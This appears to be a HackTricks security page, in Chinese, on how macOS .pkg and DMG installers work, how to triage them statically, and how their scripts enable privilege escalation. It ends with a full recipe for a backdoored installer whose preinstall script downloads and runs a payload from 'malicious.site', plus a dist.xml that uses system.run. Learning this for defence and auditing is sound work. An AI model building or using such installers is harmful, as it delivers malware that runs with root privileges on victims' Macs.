# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本信息

macOS **installer package**（也称为 `.pkg` 文件）是一种用于 macOS **分发软件**的文件格式。这些文件就像一个**盒子，包含软件正确安装和运行所需的一切内容**。

该 package 文件本身是一个存档，其中包含将在目标计算机上**安装的文件和目录层级结构**。它还可以包含用于在安装前后执行任务的**脚本**，例如设置配置文件或清理旧版本的软件。

### Package 结构

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**：自定义内容（标题、欢迎文本……）以及脚本/安装检查
- **PackageInfo (xml)**：信息、安装要求、安装位置，以及要运行的脚本路径
- **Bill of materials (bom)**：要安装、更新或删除的文件列表及其文件权限
- **Payload (CPIO archive gzip compressed)**：从 PackageInfo 中的 `install-location` 安装文件
- **Scripts (CPIO archive gzip compressed)**：安装前和安装后的脚本，以及提取到临时目录中执行的其他资源

### 解压
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压的情况下查看 installer 的内容，你也可以使用免费的工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

### Static triage 快捷方式

如果目标是进行分析，请尽量**避免先使用 `Installer.app` 打开 package**。某些 package 可以在 Installer 打开它们时立即执行代码（例如通过 `system.run()` 或 installer plug-ins），因此，离线提取通常是更安全的起点。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本信息

DMG 文件，即 Apple Disk Images，是 Apple macOS 用于磁盘映像的文件格式。DMG 文件本质上是一个**可挂载的磁盘映像**（包含自己的文件系统），其中包含通常经过压缩、有时经过加密的原始块数据。当你打开 DMG 文件时，macOS 会将其**挂载为物理磁盘**，从而允许你访问其中的内容。

> [!CAUTION]
> 请注意，**`.dmg`** installers 支持**非常多的格式**，过去其中一些包含漏洞的格式曾被滥用来获得**kernel code execution**。

### 磁盘映像结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层级结构可能因内容而异。不过，对于 application DMGs，通常遵循以下结构：

- 顶层：这是磁盘映像的根目录，通常包含 application，以及可能指向 Applications 文件夹的链接。
- Application (.app)：这是实际的 application。在 macOS 中，application 通常是一个 package，其中包含组成该 application 的许多独立文件和文件夹。
- Applications Link：这是 macOS 中指向 Applications 文件夹的快捷方式。这样设计是为了方便安装 application。你可以将 .app 文件拖到此快捷方式上，以安装 app。

## 通过 pkg abuse 进行 Privesc

### 从公共目录执行

如果 pre- 或 post-installation script 执行诸如 **`/var/tmp/Installerutil`** 的文件，并且 attacker 可以替换该文件，那么当 installer 调用它时，attacker 就能 escalate privileges。相关演示和 walkthrough 展示了这种不安全 external-script 模式的变体。<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个[public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，多个 installers 和 updaters 会调用它来**execute something as root**。此 function 接受要**execute** 的**file**的**path**作为参数；但是，如果 attacker 能够**modify** 此文件，就可以滥用其 root execution 来**escalate privileges**。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
更多信息请查看此演讲：[https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment 和 shebang abuse

Modern PackageKit 漏洞表明，installer scripts 通常会作为**受信任的 root code**执行，同时附近仍保留着攻击者可控的上下文。审计 vendor packages 时，应特别注意：

- Shell interpreters，例如 `#!/bin/zsh` / `#!/bin/bash`
- 类似 `sudo -u $USER`、`launchctl asuser` 的调用，或任何信任 `$USER`、`$HOME`、`PATH`、`TMPDIR` 或相对路径的逻辑
- 可能加载用户可控 init files 或 libraries 的 non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
对于 2024 年的 PackageKit root-environment bug（用户发起安装期间继承 `~/.zshenv` / `~/.bash*`），请查看[通用 macOS privesc 页面](../macos-privilege-escalation.md)。如果 package 是 **Apple-signed**，由于 `system_installd` 可能携带 `com.apple.rootless.install.heritable`，同一个 script bug 可能变得与 **SIP/TCC** 相关；请参阅 [SIP 页面](../macos-security-protections/macos-sip.md)。<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### 通过挂载执行

如果 installer 会写入 `/tmp/fixedname/bla/bla`，那么可以在 `/tmp/fixedname` 上方使用 noowners **创建一个 mount**，这样就能在安装期间**修改任意文件**，从而滥用安装过程。

一个例子是 **CVE-2021-26089**，它成功**覆盖了一个 periodic script**，从而以 root 身份获得执行权限。更多信息请参阅演讲：[**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## 将 pkg 作为 malware

### 空 Payload

可以只生成一个带有 **`.pkg`** 文件的 package，其中包含 **pre 和 post-install scripts**，而没有任何真实 payload，除了 scripts 内部的 malware。<sup>[[2]](#references)</sup>

### Distribution xml 中的 JS

可以在 package 的 **distribution xml** 文件中添加 **`<script>`** tags，其中的 code 会被执行，并且可以使用 **`system.run`** **执行命令**：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

对于 distribution packages，这通常取决于顶层的 `Distribution` 文件是否启用了 external scripts，例如设置 `allow-external-scripts="true"`。因此，仅检查 `preinstall` / `postinstall` 是不够的：**Distribution XML 本身**可以包含 `installation-check` / `volume-check` hooks，以及直接调用 `system.run()` / `system.runOnce()` 的执行路径。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 带后门的安装程序

使用 dist.xml 内的脚本和 JS 代码的恶意安装程序
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - 解包 Pkgs：深入了解 Macos Installer Packages 及常见安全漏洞](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0：《The Wild World of macOS Installers》- Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - 解包 Pkgs：深入了解 MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming：利用 Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822：macOS PackageKit 权限提升](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [利用 Apple-signed Packages 突破 SIP](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0：《Mount(ain) of Bugs》- Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS 上的 1000 个 Installer 造成的灾难，一切都坏了！](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
